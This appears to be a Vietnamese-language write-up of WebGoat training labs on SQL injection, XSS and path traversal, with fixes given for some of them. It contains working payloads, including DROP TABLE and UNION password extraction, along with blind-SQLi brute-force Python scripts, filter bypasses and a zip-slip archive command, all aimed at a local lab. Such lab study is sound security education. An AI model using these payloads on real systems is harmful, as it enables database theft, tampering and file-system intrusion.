# (A3) Injection

# SQL Injection (Intro)

## Lab 9

- Để lấy được tất cả dữ liệu trong bảng thì chỉ cần làm logic query thành một query luôn đúng

```sql
SELECT * FROM user_data WHERE first_name = 'John' AND last_name = ‘’ or ‘1’=’1’
```

### Lab 10

- Để lấy được tất cả dữ liệu trong bảng thì chỉ cần làm logic query thành một query luôn đúng

```sql
SELECT * FROM user_data WHERE login_count = 0 AND userid = 0 or 1 = 1
```

### Lab 11

- Payload

```sql
SELECT * FROM employees WHERE last_name = '' or 1=1 -- AND auth_tan = ''
```

### Lab 12

- Để bypass lab này thì cần phải update giá trị lương của Smith, lúc này phải sử dụng Query Chain để chèn câu lệnh update vào sau câu lệnh select
- Payload

```sql
Employee Name: <Anything>
Authentication TAN: '; UPDATE employees SET salary = 1000000 WHERE userid = '37648
```

### Lab 13

- Payload

```sql
Action contains: '; DROP TABLE access_log -- 
```

# SQL Injection **(advanced)**

## Lab 3

### Nguyên nhân lỗi

- Sử dụng untrust data nhập từ người dùng `accountName` để chèn chuỗi trực tiếp vào câu truy vấn SQL.

```java
public AttackResult injectableQuery(String accountName) {
    String query = "";
    try (Connection connection = dataSource.getConnection()) {
      boolean usedUnion = true;
      query = "SELECT * FROM user_data WHERE last_name = '" + accountName + "'";
```

### POC

- Đầu tiên sử dụng payload `' or '1'='1` để xem toàn bộ dữ liệu trong bảng `user_data`
- Sử dụng UNION để có thể xem được dữ liệu từ bảng user_system_data

```sql
' UNION SELECT userid as user_system_id, user_name, password, cookie, 'a','b',1 FROM user_system_data -- 
```

- Password của Dave là `passW0rD`

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image.png)

### Cách khắc phục

- Sử dụng PreparedStatement

## Lab 5

### Nguyên nhân lỗi

- Chèn trực tiếp giá trị vào câu query dẫn đến bị tấn công SQL Injection

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%201.png)

### POC

- Từ lỗ hổng SQL Injection này, có thể bruteforce để tìm ra từng ký tự trong mật khẩu của người dùng Tom

```python
from requests import post, put
import json  
URL = "http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge"

letters = [chr(i) for i in range(97, 123)]

numbers = [str(i) for i in range(10)]

letters += numbers

password = ""

while True:
    for char in letters:
        headers = {  
            'Cookie': 'JSESSIONID=50WEjJp0KpMHh8QPjanNPieKQi_ZGTnt66PK1FQP'
        }  
        payload = f"tom' AND password LIKE '{password + char}%' --"
        data = {
            "username_reg": payload,
            "email_reg": "a@a.com",
            "password_reg": "a",
            "confirm_password_reg": "a"
        }
        response = put(URL, data=data, headers=headers)
        if "already exists" in response.text:
            password += char
            print(password)
            break
    
```

- Chạy chương trình trên, và nó sẽ dò ra được password của tài khoản Tom

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%202.png)

- Password của Tom là `thisisasecretfortomonly` , đăng nhập với password này thì thành công.

### Cách khắc phục

- Sử dụng PreparedStatement thay vì Statement để thực hiện các truy vấn SQL với các tham số đầu vào được định dạng an toàn.

```java
  try (Connection connection = dataSource.getConnection()) {
        String checkUserQuery = "select userid from sql_challenge_users where userid = ?";
        PreparedStatement statement = connection.prepareStatement(checkUserQuery);
        statement.setString(1, username_reg);
        ResultSet resultSet = statement.executeQuery();
        if (resultSet.next()) {
          if (username_reg.contains("tom'")) {
            attackResult = success(this).feedback("user.exists").build();
          } else {
            attackResult = failed(this).feedback("user.exists").feedbackArgs(username_reg).build();
          }
        } else {
          PreparedStatement preparedStatement =
              connection.prepareStatement("INSERT INTO sql_challenge_users VALUES (?, ?, ?)");
          preparedStatement.setString(1, username_reg);
          preparedStatement.setString(2, email_reg);
          preparedStatement.setString(3, password_reg);
          preparedStatement.execute();
          attackResult = success(this).feedback("user.created").feedbackArgs(username_reg).build();
        }
  } catch (SQLException e) {
    attackResult = failed(this).output("Something went wrong").build();
  }
```

## SQL Injection (mitigation)

## Lab 9

### Nguyên nhân lỗi

- Lập trình viên chỉ đơn giản là validate input, nếu có white space thì trả failed về cho phía Client

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%203.png)

### POC

- Có thể sử dụng `/**/` để thay thế cho white space
- Payload

```sql
'/**/SELECT/**/*/**/FROM/**/user_system_data;/**/--
```

## Lab 10

### Nguyên nhân lỗi

- Vẫn sử dụng filter `white space` và kết hợp thêm filter đi 2 từ `SELECT` và `FROM`

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%204.png)

- Tuy nhiên, phần filter `SELECT` và `FROM` chỉ đơn giản là thay thế một lần và thay bằng một chuỗi rỗng `“”` → Nếu truyền `SSELECTELECT` thì khi filter thì nó sẽ trở thành SELECT, tương tự với `FROM` → Vẫn bị tấn công SQL Injection
- Về phần filter white space thì nó giống như Lab 9

### POC

- Sử dụng payload bên dưới để bypass

```sql
'/**/SESELECTLECT/**/*/**/FRFROMOM/**/user_system_data;/**/--
```

## Lab 12

- Sử dụng script python sau

```python
import requests  
  
index = 0  

headers = {  
    'Cookie': 'JSESSIONID=1JeQYvZuQvFhvbBcInM3sY6E0dKFHFK9m0Hg7RkA'  
}  

while True:  
    payload = '(CASE WHEN (SELECT ip FROM servers WHERE hostname=\'webgoat-prd\') LIKE \'{}.%\' THEN id ELSE hostname END)'.format(index)  

    r = requests.get('http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers?column=' + payload, headers=headers)  

    try:  
        response = r.json()
    except:  
        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
        break
    print(response)
    if response[0]['id'] == '1':  
        print('webgoat-prd IP: {}.130.219.202'.format(index))  
        break  
    else:  
        index += 1  
        if index > 255:  
            print("No IP found")  
            break  
```

- Chạy script trên và lấy được ip

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%205.png)

# **Cross Site Scripting**

## Lab 7

### Nguyên nhân lỗi

- Lập trình viên nhận input được nhập từ người dùng và chèn thẳng vào đoạn mã html để trả về cho phía Client mà không có một biện pháp ngăn chặn lỗ hổng XSS.

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%206.png)

### POC

- Như ở đoạn code trên, thì field1 chính là nơi dẫn đến lỗ hổng XSS.
- Chèn một đoạn script để active XSS ở phía Client như bên dưới

```jsx
<script>alert(1)</script>
```

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%207.png)

### Cách khắc phục

- Validate đầu vào dữ liệu để khó bị tấn công XSS hơn.

```jsx
if (XSS_PATTERN.test(field1) || XSS_PATTERN.test(field2)) {
    return failed(this).feedback("xss-reflected-5a-failed-wrong-field").build();
}
```

# **Cross Site Scripting (stored)**

### Nguyên nhân lỗi

- Tương tự như `Lab 7` của **Cross Site Scripting, nguyên nhân dẫn đến lỗi là dữ liệu từ người dùng không được filter mà được lưu trữ trực tiếp sau đó hiển thị trực tiếp ra → Khiến cho kẻ tấn công có thể chèn được payload XSS**

### POC

- Sử dụng payload sau để chạy được `*webgoat.customjs.phoneHome*`

```jsx
<script>webgoat.customjs.phoneHome()</script>
```

- Mở Dev Tool của browser lên thì sẽ thấy được kết quả của function `phoneHome`

# Path Traversal

## Lab 2

### Nguyên nhân lỗi

- Đầu vào dữ liệu từ phía Client được sử dụng trực tiếp để chèn vào trong việc tạo tên file, điều này khiến cho hacker có thể chèn payload vào `fullName` để thực hiện viẹc thay đổi đường dẫn lưu trữ file.

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%208.png)

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%209.png)

### POC

- Thực hiện việc upload file và bắt request này lại

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2010.png)

- Ở dữ liệu trả về đã hiển thị đường dẫn lưu trữ file. Và nhiệm vụ của chúng ta là ghi file vào đường dẫn `/home/webgoat/.webgoat-2023.8/PathTraversa`
- Lúc này chỉ cần thay đổi dữ liệu ở trường `fullName` thành `../test` rồi send request

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2011.png)

## Lab 3

### Nguyên nhân lỗi

- Nguyên nhân gây lỗi vẫn như lab trên, tuy nghiên chuỗi ký tự `../`  đã bị filter và thay thế thành chuỗi rỗng `“”`  → Tuy nhiên khi filter bằng cách này, attacker có thể chèn chuỗi `….//` để khi bị filter thì nó sẽ trở lại thành `../`

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2012.png)

### POC

- Thực hiện như các bước ở Lab 2
- Thay đổi giá trị trường `fullName` thành `….//test`

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2013.png)

## Lab 4

### Nguyên nhân lỗi

- Ở trong lab này, thay vì nguyên nhân gây lỗi đến từ `fullName` thì nó lại đến từ tên của file được upload. → Chỉ cần thay đổi tên file là có thể thực hiện tấn công path traversal

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2014.png)

### POC

- Tương tự như các bước ở lab trên.
- Thay đổi filename thành payload `../image.jpg`  và send request

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2015.png)

## Lab 5

### Nguyên nhân lỗi

- Lập trình viên tuy đã filter input từ phía Client các ký tự được sử dụng hay dùng để tấn công Path Traversal là `..`  và `/` . Tuy nhiên, bằng cách encode URL đi các ký tự này thì có thể bypass được cách filter này của lập trình viên.

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2016.png)

### POC

- Gửi một yêu cầu để lấy một ảnh Random thì phát hiện kết quả được trả về được lấy từ Location `/PathTraversal/random-picture?id=3.jpg`

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2017.png)

- Đây chính là nơi bị Path Traversal, thay đổi `id` thành `%2e%2e%2f` sau đó gửi request thì không bị filter nữa và hiển thị danh sách các file.

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2018.png)

- Với payload `%2e%2e%2f%2e%2e%2f` thì có thể tìm thấy được file cần tìm `path-traversal-secret.jpg`

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2019.png)

- Dùng payload `%2e%2e%2f%2e%2e%2fpath-traversal-secret` để đọc file này.

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2020.png)

## Lab 7

### Nguyên nhân lỗi

- Khi giải nén file thì không kiểm tra kỹ tên file, điều này khiến cho kẻ tấn công có thể thay đổi tên file nén → dẫn đến có thể kiểm soát được đường dẫn mà file giải nén được giải nén.

![image.png]((A3)%20Injection%2062a301a7fd4143a4ad699d1a864c382e/image%2021.png)

### POC

- Tạo một đường dẫn muốn tấn công trên máy attack, ở đây là `/home/webgoat/.webgoat-2023.8/PathTraversal/shr3wd/shr3wd.jpg`

```bash
mkdir /home/webgoat/.webgoat-2023.8/PathTraversal/shr3wd
cd /home/webgoat/.webgoat-2023.8/PathTraversal/shr3wd
file shr3wd.jpg
```

- Sau đó nén file với đường dẫn này

```bash
zip evil.zip ../../../../../../../../home/webgoat/.webgoat-2023.8/PathTraversal/shr3wd/shr3wd.jpg
```

- Upload file `evil.zip`này lên để bypass được

### Cách khắc phục

```java
try {
    Path uploadedZipFile = tmpZipDirectory.resolve(file.getOriginalFilename());
    FileCopyUtils.copy(file.getBytes(), uploadedZipFile.toFile());

    try (ZipFile zip = new ZipFile(uploadedZipFile.toFile())) {
        Enumeration<? extends ZipEntry> entries = zip.entries();
        while (entries.hasMoreElements()) {
            ZipEntry e = entries.nextElement();

            Path resolvedPath = tmpZipDirectory.resolve(e.getName()).normalize();

            if (!resolvedPath.startsWith(tmpZipDirectory)) {
                throw new IOException("Zip entry is outside of the target directory: " + e.getName());
            }

            if (e.isDirectory()) {
                Files.createDirectories(resolvedPath);
            } else {
                Files.createDirectories(resolvedPath.getParent());

                try (InputStream is = zip.getInputStream(e)) {
                    Files.copy(is, resolvedPath, StandardCopyOption.REPLACE_EXISTING);
                }
            }
        }
    }

    return isSolved(currentImage, getProfilePictureAsBase64());
} catch (IOException e) {
    return failed(this).output("An error occurred during file processing.").build();
}

```